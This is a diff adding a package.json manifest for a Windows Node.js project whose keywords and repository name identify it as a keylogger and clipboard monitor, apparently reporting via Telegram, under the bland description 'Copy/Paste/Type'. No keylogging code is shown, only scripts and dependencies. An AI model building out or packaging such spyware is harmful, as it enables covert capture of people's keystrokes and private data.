@@ -1,0 +1,50 @@
+{
+  "name": "k",
+  "version": "1.0.0",
+  "description": "Copy/Paste/Type",
+  "main": "k.js",
+  "scripts": {
+    "start": "node k.js",
+    "dev": "node k.js",
+    "test": "node k.js test",
+    "install-deps": "npm install",
+    "setup": "npm install && node k.js"
+  },
+  "keywords": [
+    "keylogger",
+    "clipboard",
+    "monitor",
+    "tracking",
+    "telegram",
+    "windows",
+    "unicode",
+    "multilingual"
+  ],
+  "author": "Enhanced Monitoring System",
+  "license": "MIT",
+  "dependencies": {
+    "active-win": "^8.2.0"
+  },
+  "optionalDependencies": {
+    "active-win": "^8.2.0"
+  },
+  "engines": {
+    "node": ">=14.0.0"
+  },
+  "os": [
+    "win32"
+  ],
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/your-repo/unified-keylogger.git"
+  },
+  "bugs": {
+    "url": "https://github.com/your-repo/unified-keylogger/issues"
+  },
+  "homepage": "https://github.com/your-repo/unified-keylogger#readme",
+  "devDependencies": {},
+  "funding": {
+    "type": "individual",
+    "url": "https://github.com/sponsors/your-username"
+  }
+}
